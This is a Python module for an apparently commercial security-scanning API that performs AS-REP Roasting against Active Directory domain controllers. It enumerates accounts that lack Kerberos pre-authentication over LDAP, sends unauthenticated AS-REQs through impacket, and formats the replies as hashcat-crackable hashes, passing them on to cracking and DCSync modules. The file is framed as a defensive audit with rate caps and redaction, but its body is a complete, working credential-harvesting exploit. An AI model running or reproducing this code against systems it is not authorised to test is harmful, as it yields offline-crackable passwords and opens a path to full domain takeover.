"""asreproast_audit - AS-REP Roasting audit (MITRE T1558.004) via VL-METHOD.

KEY DIFFERENTIATOR vs Kerberoasting (T1558.003): this attack works
PRE-AUTH. The scanner does NOT require valid AD credentials - any host
that can reach TCP/88 on a Domain Controller can request AS-REP tickets
for accounts whose userAccountControl carries the
UF_DONT_REQUIRE_PREAUTH flag (decimal 4194304). The AS-REP contains
material encrypted with the target account's password-derived key,
which is offline-crackable with hashcat -m 18200.

7-stage VL-METHOD flow:

  1. PRE-FLIGHT  - dc_ip + domain are mandatory. TCP-test dc_ip:88; skip
                    cleanly if Kerberos is unreachable.

  2. FINGERPRINT - Anonymous ldap3 bind to dc_ip:389. Read rootDSE for
                    naming contexts, domain functional level, DNS host
                    name. Captures the *signal* that anonymous bind was
                    accepted at all (separate HIGH finding).

  3. QUICK PROBE - Build a target user list (one of four paths) and send
                    an unauthenticated AS-REQ per user with impacket's
                    Kerberos primitives:
                      KDC_ERR_PREAUTH_REQUIRED  -> NOT roastable (good)
                      KDC_ERR_C_PRINCIPAL_UNKNOWN -> account doesn't exist
                      Returns AS-REP            -> ROASTABLE, hash captured
                    Hard cap: 100 users in quick_probe.

  4. DEEP SCAN   - Only fires if options.deep_userlist is provided. Tests
                    a larger list (hard cap 500 users total across the
                    deep_scan stage) to catch dormant misconfigured
                    accounts beyond the initial set.

  5. VERIFY      - Validate the captured hash matches hashcat -m 18200
                    format: `$krb5asrep$<etype>$user@DOMAIN:<chk>$<data>`
                    with valid hex tail. CONFIRMED if format checks pass.

  6. PRIVILEGE   - Classify by username + UAC flag heuristics:
                    krbtgt              -> domain_root_critical (CRITICAL)
                    administrator/admin -> admin_target           (CRITICAL)
                    service / svc_      -> service_account        (HIGH)
                    everything else     -> user                   (MEDIUM)

  7. CHAIN       - CONFIRMED -> john_hash_audit (offline crack the AS-REP).
                    If privilege is domain_root_critical or admin_target,
                    additionally chain dcsync_audit so that any cracked
                    password gets immediately tested for DCSync rights.

Customer input via ScanRequest.options:
  - dc_ip          Domain Controller IP (required)
  - domain         AD domain name (required, e.g. "corp.local")
  - userlist       Newline-separated usernames to test (optional)
  - deep_userlist  Larger newline-separated list for deep_scan (optional)
  - chain_creds    Inherited creds from upstream scanners (optional, used
                    for authenticated LDAP enumeration if anonymous bind
                    is disabled and no explicit userlist was supplied)
  - show_plaintext Bool. If True, AS-REP hashes are emitted verbatim
                    instead of redacted (customer scanning own infra).

If no userlist source is available, the scanner falls back to a top-10
common AD usernames list so a quick smoke-test still produces signal.
"""
from __future__ import annotations

import asyncio
import re
from typing import Optional

from fastapi import APIRouter, Depends
from pydantic import BaseModel

from tools._shared import ScanRequest, verify_scan_quota
from tools._framework import ScanContext
from tools._methodology import MethodologyScanner, helpers
from tools._payloads.asreproast_audit_findings import (
    ASREPROAST_AUDIT_FINDING_RULES,
    INTEL_FIELDS,
)

router = APIRouter()

# Hard safety caps - prevent runaway enumeration that could DoS a DC.
HARD_MAX_QUICK_USERS = 100
HARD_MAX_DEEP_USERS = 500

# Top-10 commonly-present AD usernames used as a last-resort smoke test
# when no userlist source can be derived (no explicit list, no anon bind,
# no chain_creds). Sized to stay well under the 100-user quick cap.
DEFAULT_AD_USERS = [
    "administrator", "admin", "guest", "krbtgt", "support",
    "helpdesk", "service", "test", "user", "backup",
]

# userAccountControl bit for "Do not require Kerberos preauthentication"
UF_DONT_REQUIRE_PREAUTH = 0x400000  # 4194304

# Hashcat -m 18200 prefix
_HASHCAT_AS_REP_PREFIX = "$krb5asrep$"
_RE_KRB5ASREP = re.compile(
    r"^\$krb5asrep\$\d+\$[^\s:]+:[0-9a-fA-F]+\$[0-9a-fA-F]+$"
)


# Try to import impacket once at module import; if missing, the scanner
# still loads but pre_flight marks ctx.state['impacket_missing']=True.
try:
    from impacket.krb5 import constants as _krb_constants  # noqa: F401
    from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError  # noqa: F401
    from impacket.krb5.types import Principal  # noqa: F401
    from impacket.krb5.asn1 import AS_REP  # noqa: F401
    _IMPACKET_OK = True
except Exception:
    _IMPACKET_OK = False


class AsreproastAuditRequest(ScanRequest):
    options: Optional[dict] = None


def _redact(hash_str: str, show_plaintext: bool = False) -> str:
    """Customer-safe redaction for AS-REP hashes.

    Default behaviour returns a marker showing length + last 6 hex chars
    so the customer can correlate findings without the raw hash leaking
    into multi-tenant PDF storage. When show_plaintext=True (customer is
    scanning their own infrastructure) the full hash is returned so it
    can be piped directly into hashcat.
    """
    if not hash_str:
        return "len=0"
    h = hash_str.strip()
    if show_plaintext:
        return h
    if len(h) <= 6:
        return f"len={len(h)} ***"
    return f"len={len(h)} ***{h[-6:]}"


def _split_users(raw: str, cap: int) -> list[str]:
    """Trim + dedupe + clamp a newline-separated username list."""
    if not raw:
        return []
    seen: list[str] = []
    for line in raw.splitlines():
        v = line.strip()
        # Drop blank lines, comments, and DN-style entries
        if not v or v.startswith("#"):
            continue
        # If user supplied "DOMAIN\\user" or "user@domain" strip to sam
        if "\\" in v:
            v = v.split("\\", 1)[1]
        if "@" in v:
            v = v.split("@", 1)[0]
        if v in seen:
            continue
        seen.append(v)
        if len(seen) >= cap:
            break
    return seen


# ═══════════════════════════════════════════════════════════════════
#  Sync impacket helpers (run in executor from async stages)
# ═══════════════════════════════════════════════════════════════════


def _ldap_rootdse(dc_ip: str) -> dict:
    """Anonymous ldap3 bind to dc_ip:389 - read rootDSE.
    Returns dict with anonymous_bind_allowed, naming_contexts,
    domain_functional_level, dns_host_name (best-effort, never raises).
    """
    out = {
        "anonymous_bind_allowed": False,
        "naming_contexts": [],
        "domain_functional_level": "",
        "dns_host_name": "",
    }
    try:
        from ldap3 import Server, Connection, ANONYMOUS, DSA
    except Exception:
        return out
    try:
        server = Server(dc_ip, port=389, get_info=DSA, connect_timeout=4)
        conn = Connection(server, authentication=ANONYMOUS,
                          auto_bind=False, receive_timeout=4)
        bound = False
        try:
            bound = conn.bind()
        except Exception:
            bound = False
        if bound:
            out["anonymous_bind_allowed"] = True
            info = server.info
            if info is not None:
                ncs = getattr(info, "naming_contexts", None) or []
                try:
                    out["naming_contexts"] = [str(x) for x in ncs][:5]
                except Exception:
                    pass
                other = getattr(info, "other", None) or {}
                try:
                    dfl = other.get("domainFunctionality") or []
                    if dfl:
                        out["domain_functional_level"] = str(dfl[0])
                    dns = other.get("dnsHostName") or []
                    if dns:
                        out["dns_host_name"] = str(dns[0])
                except Exception:
                    pass
            try:
                conn.unbind()
            except Exception:
                pass
    except Exception:
        pass
    return out


def _ldap_enumerate_npusers(dc_ip: str, domain: str,
                            bind_user: str = "", bind_pwd: str = "",
                            cap: int = HARD_MAX_QUICK_USERS) -> list[str]:
    """LDAP search for accounts with UF_DONT_REQUIRE_PREAUTH set.

    Filter matches normal user objects (samAccountType=805306368) whose
    userAccountControl bit-AND with 4194304 is non-zero. Pulls
    sAMAccountName attribute. Returns up to `cap` usernames.

    If bind_user is empty, attempts anonymous bind. If anonymous fails
    or returns empty, caller should fall through to default list.
    """
    out: list[str] = []
    try:
        from ldap3 import Server, Connection, ANONYMOUS, SIMPLE, SUBTREE
    except Exception:
        return out
    try:
        base_dn = ",".join(f"DC={p}" for p in domain.split(".") if p)
        if not base_dn:
            return out
        server = Server(dc_ip, port=389, connect_timeout=4)
        if bind_user:
            user_dn = bind_user if "\\" in bind_user or "@" in bind_user \
                else f"{domain}\\{bind_user}"
            conn = Connection(server, user=user_dn, password=bind_pwd,
                              authentication=SIMPLE, auto_bind=False,
                              receive_timeout=6)
        else:
            conn = Connection(server, authentication=ANONYMOUS,
                              auto_bind=False, receive_timeout=6)
        try:
            ok = conn.bind()
        except Exception:
            ok = False
        if not ok:
            return out
        try:
            conn.search(
                search_base=base_dn,
                search_filter=("(&(samAccountType=805306368)"
                               "(userAccountControl:1.2.840.113556.1.4.803"
                               ":=4194304))"),
                search_scope=SUBTREE,
                attributes=["sAMAccountName"],
                size_limit=cap,
                time_limit=8,
            )
            for entry in (conn.entries or [])[:cap]:
                try:
                    sam = str(entry.sAMAccountName.value or "").strip()
                    if sam and sam not in out:
                        out.append(sam)
                except Exception:
                    continue
        except Exception:
            pass
        try:
            conn.unbind()
        except Exception:
            pass
    except Exception:
        pass
    return out


def _try_asrep_for_user(domain: str, dc_ip: str, user: str) -> dict:
    """Send an unauthenticated AS-REQ for a single user.

    Returns dict:
      {"user": ..., "status": "ROASTABLE"|"PREAUTH_REQUIRED"|"UNKNOWN_PRINCIPAL"|"ERROR",
       "hash": "$krb5asrep$..." | "",
       "etype": int|0, "error_detail": str}
    """
    result = {
        "user": user, "status": "ERROR", "hash": "", "etype": 0,
        "error_detail": "",
    }
    if not _IMPACKET_OK:
        result["error_detail"] = "impacket not importable"
        return result
    try:
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import AS_REQ, AS_REP, KERB_PA_PAC_REQUEST
        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
        from impacket.krb5.types import Principal, KerberosTime
        from pyasn1.codec.der import decoder, encoder
        from pyasn1.type.univ import noValue
        import datetime as _dt
        import random as _r
    except Exception as e:
        result["error_detail"] = f"impacket import failed: {type(e).__name__}: {e}"
        return result

    # Build an AS-REQ identical in shape to impacket's GetNPUsers.py.
    try:
        clientName = Principal(
            user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        serverName = Principal(
            f"krbtgt/{domain.upper()}",
            type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()
        asReq["pvno"] = 5
        asReq["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        # PA-PAC-REQUEST - tell KDC we want a PAC (matches normal client)
        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest["include-pac"] = True
        encodedPacRequest = encoder.encode(pacRequest)
        asReq["padata"] = noValue
        asReq["padata"][0] = noValue
        asReq["padata"][0]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq["padata"][0]["padata-value"] = encodedPacRequest

        reqBody = asReq["req-body"]
        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody["kdc-options"] = constants.encodeFlags(opts)
        reqBody["cname"] = noValue
        reqBody["cname"]["name-type"] = (
            constants.PrincipalNameType.NT_PRINCIPAL.value)
        reqBody["cname"]["name-string"] = noValue
        reqBody["cname"]["name-string"][0] = user
        reqBody["realm"] = domain.upper()
        reqBody["sname"] = noValue
        reqBody["sname"]["name-type"] = (
            constants.PrincipalNameType.NT_PRINCIPAL.value)
        reqBody["sname"]["name-string"] = noValue
        reqBody["sname"]["name-string"][0] = "krbtgt"
        reqBody["sname"]["name-string"][1] = domain.upper()
        now = _dt.datetime.utcnow() + _dt.timedelta(days=1)
        reqBody["till"] = KerberosTime.to_asn1(now)
        reqBody["rtime"] = KerberosTime.to_asn1(now)
        reqBody["nonce"] = _r.SystemRandom().getrandbits(31)
        supported = (
            constants.EncryptionTypes.rc4_hmac.value,
            constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
            constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
            constants.EncryptionTypes.des3_cbc_sha1_kd.value,
            constants.EncryptionTypes.des_cbc_md5.value,
        )
        seq = noValue
        for i, et in enumerate(supported):
            seq[i] = et
        reqBody["etype"] = seq

        message = encoder.encode(asReq)
        try:
            r = sendReceive(message, domain.upper(), dc_ip)
        except KerberosError as ke:
            try:
                code = ke.getErrorCode()
            except Exception:
                code = -1
            # KDC_ERR_PREAUTH_REQUIRED = 25 -> account requires pre-auth
            if code == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                result["status"] = "PREAUTH_REQUIRED"
                return result
            if code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                result["status"] = "UNKNOWN_PRINCIPAL"
                return result
            result["error_detail"] = f"KerberosError code={code}"
            return result
        except Exception as e:
            result["error_detail"] = f"{type(e).__name__}: {str(e)[:160]}"
            return result

        # If we got here, we have an AS-REP without pre-auth - ROASTABLE.
        try:
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
            etype = int(asRep["enc-part"]["etype"])
            cipher_bytes = bytes(asRep["enc-part"]["cipher"])
            # hashcat -m 18200 format:
            #   $krb5asrep$<etype>$user@REALM:<first16-hex>$<rest-hex>
            cipher_hex = cipher_bytes.hex()
            checksum = cipher_hex[:32]
            data = cipher_hex[32:]
            hash_str = (
                f"$krb5asrep${etype}${user}@{domain.upper()}:"
                f"{checksum}${data}"
            )
            result["status"] = "ROASTABLE"
            result["hash"] = hash_str
            result["etype"] = etype
            return result
        except Exception as e:
            result["error_detail"] = (
                f"AS-REP decode failed: {type(e).__name__}: {str(e)[:160]}"
            )
            return result

    except Exception as e:
        result["error_detail"] = (
            f"AS-REQ build failed: {type(e).__name__}: {str(e)[:160]}"
        )
        return result


async def _async_try_asrep(domain: str, dc_ip: str, user: str) -> dict:
    """Async wrapper that runs the sync impacket call in an executor."""
    loop = asyncio.get_event_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(None, _try_asrep_for_user, domain, dc_ip, user),
            timeout=12.0,
        )
    except asyncio.TimeoutError:
        return {"user": user, "status": "ERROR", "hash": "", "etype": 0,
                "error_detail": "AS-REQ timeout"}


# ═══════════════════════════════════════════════════════════════════
#  AsreproastAudit - the VL-METHOD scanner class
# ═══════════════════════════════════════════════════════════════════


class AsreproastAudit(MethodologyScanner):
    name = "asreproast_audit"

    # ── STAGE 1: PRE-FLIGHT ──────────────────────────────────────
    async def pre_flight(self, ctx: ScanContext) -> bool:
        opts = ctx.state.get("_options") or {}
        dc_ip = (opts.get("dc_ip") or "").strip()
        domain = (opts.get("domain") or "").strip()
        if not dc_ip or not domain:
            ctx.state["skipped_reason"] = (
                "requires dc_ip + domain options to test AS-REP roasting"
            )
            return False
        # Mark impacket import status for the findings layer
        if not _IMPACKET_OK:
            ctx.state["impacket_missing"] = True
        ctx.state["dc_ip"] = dc_ip
        ctx.state["domain"] = domain
        reachable = await helpers.port_open(dc_ip, 88, timeout=4.0)
        ctx.state["kerberos_reachable"] = reachable
        if not reachable:
            ctx.state["skipped_reason"] = (
                f"Kerberos service on {dc_ip}:88 not reachable "
                "(firewall, DC down, or wrong IP)"
            )
            return False
        return True

    # ── STAGE 2: FINGERPRINT ─────────────────────────────────────
    async def fingerprint(self, ctx: ScanContext):
        dc_ip = ctx.state.get("dc_ip") or ctx.host
        loop = asyncio.get_event_loop()
        try:
            fp = await asyncio.wait_for(
                loop.run_in_executor(None, _ldap_rootdse, dc_ip),
                timeout=8.0,
            )
        except asyncio.TimeoutError:
            fp = {
                "anonymous_bind_allowed": False,
                "naming_contexts": [],
                "domain_functional_level": "",
                "dns_host_name": "",
            }
        ctx.state["fingerprint"] = fp
        ctx.state["anonymous_bind_allowed"] = bool(
            fp.get("anonymous_bind_allowed"))

    # ── STAGE 3: QUICK PROBE ─────────────────────────────────────
    async def quick_probe(self, ctx: ScanContext) -> list[dict]:
        if not _IMPACKET_OK:
            # impacket missing already flagged in pre_flight; emit nothing.
            ctx.state["asrep_users_tested"] = 0
            ctx.state["asrep_roastable_count"] = 0
            ctx.state["quick_probe_attempts"] = 0
            ctx.state["quick_probe_hits"] = 0
            return []

        opts = ctx.state.get("_options") or {}
        dc_ip = ctx.state["dc_ip"]
        domain = ctx.state["domain"]
        show = bool(opts.get("show_plaintext"))

        # ── Build target user list (priority order) ──────────────
        users: list[str] = []
        source = ""
        explicit = (opts.get("userlist") or "").strip()
        if explicit:
            users = _split_users(explicit, HARD_MAX_QUICK_USERS)
            source = "options.userlist"
        elif ctx.state.get("anonymous_bind_allowed"):
            loop = asyncio.get_event_loop()
            try:
                users = await asyncio.wait_for(
                    loop.run_in_executor(
                        None, _ldap_enumerate_npusers,
                        dc_ip, domain, "", "", HARD_MAX_QUICK_USERS),
                    timeout=10.0,
                )
            except asyncio.TimeoutError:
                users = []
            if users:
                source = "ldap_anonymous_npuser_filter"
        if not users:
            chain_creds = opts.get("chain_creds") or []
            if chain_creds and isinstance(chain_creds, list):
                first = chain_creds[0] or {}
                cu = (first.get("user") or "").strip()
                cp = (first.get("pwd") or "").strip()
                if cu and cp:
                    loop = asyncio.get_event_loop()
                    try:
                        users = await asyncio.wait_for(
                            loop.run_in_executor(
                                None, _ldap_enumerate_npusers,
                                dc_ip, domain, cu, cp, HARD_MAX_QUICK_USERS),
                            timeout=10.0,
                        )
                    except asyncio.TimeoutError:
                        users = []
                    if users:
                        source = "ldap_chain_creds_npuser_filter"
        if not users:
            users = list(DEFAULT_AD_USERS)
            source = "default_top10_smoke_test"

        users = users[:HARD_MAX_QUICK_USERS]
        ctx.state["user_source"] = source

        # ── Send AS-REQ per user ─────────────────────────────────
        findings: list[dict] = []
        roastable_count = 0
        # Run a small async pool - cap concurrency at 5 to be polite to DC
        sem = asyncio.Semaphore(5)

        async def _probe(u):
            async with sem:
                return await _async_try_asrep(domain, dc_ip, u)

        results = await asyncio.gather(
            *[_probe(u) for u in users], return_exceptions=True)

        for i, r in enumerate(results):
            if isinstance(r, Exception):
                continue
            if not isinstance(r, dict):
                continue
            if r.get("status") != "ROASTABLE":
                continue
            roastable_count += 1
            raw_hash = r.get("hash", "")
            findings.append({
                "id": f"asrep_{i}",
                "kind": "asrep_roastable_account",
                "user": r.get("user", ""),
                "hash_marker": _redact(raw_hash, show_plaintext=show),
                "_hash_private": raw_hash,  # internal - chained scanners read this
                "etype": r.get("etype", 0),
                "discovery_method": "impacket_as_req_no_preauth",
            })

        ctx.state["asrep_users_tested"] = len(users)
        ctx.state["asrep_roastable_count"] = roastable_count
        ctx.state["quick_probe_attempts"] = len(users)
        ctx.state["quick_probe_hits"] = roastable_count
        return findings

    # ── STAGE 4: DEEP SCAN ───────────────────────────────────────
    async def deep_scan(self, ctx: ScanContext) -> list[dict]:
        if not _IMPACKET_OK:
            return []
        opts = ctx.state.get("_options") or {}
        deep_raw = (opts.get("deep_userlist") or "").strip()
        if not deep_raw:
            ctx.state["deep_skipped"] = "no deep_userlist supplied"
            return []
        # Compute remaining budget after quick_probe
        already_tested = int(ctx.state.get("asrep_users_tested") or 0)
        remaining = max(0, HARD_MAX_DEEP_USERS - already_tested)
        if remaining <= 0:
            ctx.state["deep_skipped"] = "deep_scan budget exhausted by quick_probe"
            return []
        candidates = _split_users(deep_raw, remaining)
        if not candidates:
            ctx.state["deep_skipped"] = "deep_userlist empty after dedupe"
            return []

        dc_ip = ctx.state["dc_ip"]
        domain = ctx.state["domain"]
        show = bool(opts.get("show_plaintext"))

        sem = asyncio.Semaphore(5)

        async def _probe(u):
            async with sem:
                return await _async_try_asrep(domain, dc_ip, u)

        results = await asyncio.gather(
            *[_probe(u) for u in candidates], return_exceptions=True)

        findings: list[dict] = []
        added = 0
        for i, r in enumerate(results):
            if isinstance(r, Exception) or not isinstance(r, dict):
                continue
            if r.get("status") != "ROASTABLE":
                continue
            added += 1
            raw_hash = r.get("hash", "")
            findings.append({
                "id": f"asrep_deep_{i}",
                "kind": "asrep_roastable_account",
                "user": r.get("user", ""),
                "hash_marker": _redact(raw_hash, show_plaintext=show),
                "_hash_private": raw_hash,
                "etype": r.get("etype", 0),
                "discovery_method": "impacket_as_req_no_preauth_deep",
            })

        # Update aggregate counters
        ctx.state["asrep_users_tested"] = already_tested + len(candidates)
        ctx.state["asrep_roastable_count"] = int(
            ctx.state.get("asrep_roastable_count") or 0) + added
        return findings

    # ── STAGE 5: VERIFY ──────────────────────────────────────────
    async def verify(self, ctx: ScanContext, finding: dict) -> Optional[dict]:
        raw = finding.get("_hash_private", "")
        if (raw
                and raw.startswith(_HASHCAT_AS_REP_PREFIX)
                and _RE_KRB5ASREP.match(raw)):
            finding["confidence"] = "CONFIRMED"
            finding["verification_method"] = "hashcat_format_18200_validated"
        else:
            finding["confidence"] = "SUSPECTED"
            finding["verification_method"] = "hash_format_invalid_or_partial"
        return finding

    # ── STAGE 6: PRIVILEGE CHECK ─────────────────────────────────
    async def privilege_check(self, ctx: ScanContext, finding: dict) -> dict:
        user = (finding.get("user") or "").lower()
        if user == "krbtgt":
            finding["privilege_level"] = "domain_root_critical"
        elif user in ("administrator", "admin") or user.startswith("admin_"):
            finding["privilege_level"] = "admin_target"
        elif (user.startswith("svc_")
              or user.startswith("svc-")
              or user.startswith("service")
              or user.endswith("_svc")
              or user.endswith("-svc")):
            finding["privilege_level"] = "service_account"
        else:
            finding["privilege_level"] = "user"
        return finding

    # ── STAGE 7: CHAIN HANDOFF ───────────────────────────────────
    async def chain_handoff(self, ctx: ScanContext,
                            findings: list[dict]) -> list[str]:
        next_scanners: list[str] = []
        wants_dcsync = False
        for f in findings:
            if f.get("confidence") != "CONFIRMED":
                continue
            if "john_hash_audit" not in next_scanners:
                next_scanners.append("john_hash_audit")
            priv = f.get("privilege_level", "")
            if priv in ("domain_root_critical", "admin_target"):
                wants_dcsync = True
        if wants_dcsync and "dcsync_audit" not in next_scanners:
            next_scanners.append("dcsync_audit")
        return next_scanners


# ═══════════════════════════════════════════════════════════════════
#  Endpoint wrapper
# ═══════════════════════════════════════════════════════════════════


@router.post("/api/password/asreproast_audit")
async def password_asreproast_audit(req: AsreproastAuditRequest,
                                     _=Depends(verify_scan_quota)):
    scanner = AsreproastAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=ASREPROAST_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


def register(app):
    app.include_router(router)


# ═══════════════════════════════════════════════════════════════════
#  Chain registry registration (must be at the very bottom)
# ═══════════════════════════════════════════════════════════════════


async def _chain_callable(target: str, options: dict, jwt=None) -> dict:
    opts = options or {}
    if not opts.get("dc_ip"):
        opts["dc_ip"] = target
    req = AsreproastAuditRequest(target=target, options=opts)
    scanner = AsreproastAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=ASREPROAST_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


from tools._methodology import chain_registry  # noqa: E402
chain_registry.register("asreproast_audit", _chain_callable)
